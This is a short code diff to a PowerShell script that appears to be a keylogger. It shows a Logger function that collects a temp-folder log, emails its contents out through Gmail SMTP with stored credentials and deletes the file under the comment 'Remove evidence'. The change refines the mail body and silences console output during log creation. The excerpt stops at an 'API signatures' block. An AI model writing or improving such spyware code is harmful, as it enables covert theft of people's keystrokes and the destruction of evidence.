@@ -12,13 +12,14 @@ function Logger($logFile="$env:temp/a.log") {
     # Dateiinhalt auslesen
     $content = Get-Content -Path $logFile
     # Send mail
-    Send-MailMessage -From $From -To $To -Subject $Subject -Body $content -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $Credential
+    Send-MailMessage -From $From -To $To -Subject $Subject -Body ($content -join "`r`n") -SmtpServer "smtp.gmail.com" -port 587 -Credential $Credential -UseSsl
     # Remove evidence
     Remove-Item $logFile -Force
   }
 
   # generate log file
-  New-Item -ItemType File -Path $logFile  -Force
+  # assign to variable to avoid console output
+  $null = New-Item -ItemType File -Path $logFile  -Force
 
   # API signatures
   $APIsignatures = @'
